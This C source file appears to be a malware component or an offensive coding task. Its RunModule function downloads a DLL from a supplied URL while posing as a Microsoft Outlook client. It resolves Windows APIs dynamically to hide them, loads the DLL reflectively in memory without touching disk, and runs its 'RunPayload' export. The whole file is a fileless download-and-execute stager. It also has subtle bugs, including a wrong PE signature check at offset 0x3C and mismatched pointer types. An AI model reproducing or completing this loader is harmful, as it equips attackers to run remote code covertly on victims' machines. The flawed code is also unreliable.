// modular_payload.c

#include "modular_payload.h"
#include "api_resolution.h"
#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <stdlib.h>
#include <string.h>

// API function pointer types
typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);

// --- FUNCTION TO IMPLEMENT ---
// This function downloads a DLL from a URL, loads it into memory, and executes its "RunPayload" export.
void RunModule(const char* module_url) {
    if (!module_url) return;

    // Resolve WinINet APIs for downloading the file
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)resolve_api("wininet.dll", "InternetOpenUrlA");
    pInternetReadFile InternetReadFile = (pInternetReadFile)resolve_api("wininet.dll", "InternetReadFile");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");

    if (!InternetOpenA || !InternetOpenUrlA || !InternetReadFile || !InternetCloseHandle) {
        return;
    }

// 1. Download the DLL from the URL into a memory buffer
    HINTERNET hInternet = InternetOpenA("Microsoft Outlook/16.0.14326.20454", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, module_url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return;
    }

    // Allocate a buffer for the DLL. A 10MB buffer should be sufficient for most modules.
    DWORD bufferSize = 10 * 1024 * 1024;
    LPVOID dllBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!dllBuffer) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return;
    }

    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    while (totalBytesRead < bufferSize) {
        if (!InternetReadFile(hUrl, (char*)dllBuffer + totalBytesRead, bufferSize - totalBytesRead, &bytesRead) || bytesRead == 0) {
            break;
        }
        totalBytesRead += bytesRead;
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (totalBytesRead == 0) {
        VirtualFree(dllBuffer, 0, MEM_RELEASE);
        return; // Download failed
    }

    // Validate PE file signature
    if (*(DWORD*)((BYTE*)dllBuffer + 0x3C) != IMAGE_NT_SIGNATURE) {
        VirtualFree(dllBuffer, 0, MEM_RELEASE);
        return; // Not a valid PE file
    }

// 2. Pure reflective DLL loading (no disk write)
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(dllBuffer, 0, MEM_RELEASE);
        return;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllBuffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(dllBuffer, 0, MEM_RELEASE);
        return;
    }

    // Allocate memory for the DLL image
    LPVOID pImageBase = VirtualAlloc(NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pImageBase) {
        VirtualFree(dllBuffer, 0, MEM_RELEASE);
        return;
    }

    // Copy headers to new memory
    memcpy(pImageBase, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)pImageBase + pSectionHeader[i].VirtualAddress,
               (BYTE*)dllBuffer + pSectionHeader[i].PointerToRawData,
               pSectionHeader[i].SizeOfRawData);
    }

    // Resolve imports
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (pImportDesc->Name) {
        LPCSTR szDllName = (LPCSTR)((BYTE*)pImageBase + pImportDesc->Name);
        HMODULE hModule = LoadLibraryA(szDllName);
        if (hModule) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)pImageBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFunc = (PIMAGE_THUNK_DATA)((BYTE*)pImageBase + pImportDesc->FirstThunk);
            while (pThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    pFunc->u1.Function = (ULONG_PTR)GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pImageBase + pThunk->u1.AddressOfData);
                    pFunc->u1.Function = (ULONG_PTR)GetProcAddress(hModule, pImportName->Name);
                }
                pThunk++;
                pFunc++;
            }
        }
        pImportDesc++;
    }

    // Apply relocations
    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD dwDelta = (DWORD)((BYTE*)pImageBase - pNtHeaders->OptionalHeader.ImageBase);
    while (pReloc->VirtualAddress) {
        if (dwDelta) {
            WORD* pRelocData = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i++) {
                if (pRelocData[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                    PDWORD pPatch = (PDWORD)((BYTE*)pImageBase + pReloc->VirtualAddress + (pRelocData[i] & 0xFFF));
                    *pPatch += dwDelta;
                }
            }
        }
        pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
    }

    // Change memory protection to execute
    DWORD oldProtect;
    VirtualProtect(pImageBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect);

    // 3. Execute the payload from the loaded DLL
    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint) {
        // Find the exported "RunPayload" function
        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (pExportDir) {
            LPCSTR* pNames = (LPCSTR*)((BYTE*)pImageBase + pExportDir->AddressOfNames);
            PDWORD pAddresses = (PDWORD*)((BYTE*)pImageBase + pExportDir->AddressOfFunctions);
            PWORD pOrdinals = (PWORD*)((BYTE*)pImageBase + pExportDir->AddressOfNameOrdinals);

            for (int i = 0; i < pExportDir->NumberOfNames; i++) {
                if (strcmp(pNames[i], "RunPayload") == 0) {
                    typedef void (*RUNPAYLOAD_FUNC)();
                    RUNPAYLOAD_FUNC pRunPayload = (RUNPAYLOAD_FUNC)((BYTE*)pImageBase + pAddresses[pOrdinals[i]]);
                    if (pRunPayload) {
                        // Execute the payload
                        pRunPayload();
                    }
                    break;
                }
            }
        }
    }

    // 4. Clean up
    VirtualFree(pImageBase, 0, MEM_RELEASE);
    VirtualFree(dllBuffer, 0, MEM_RELEASE);
}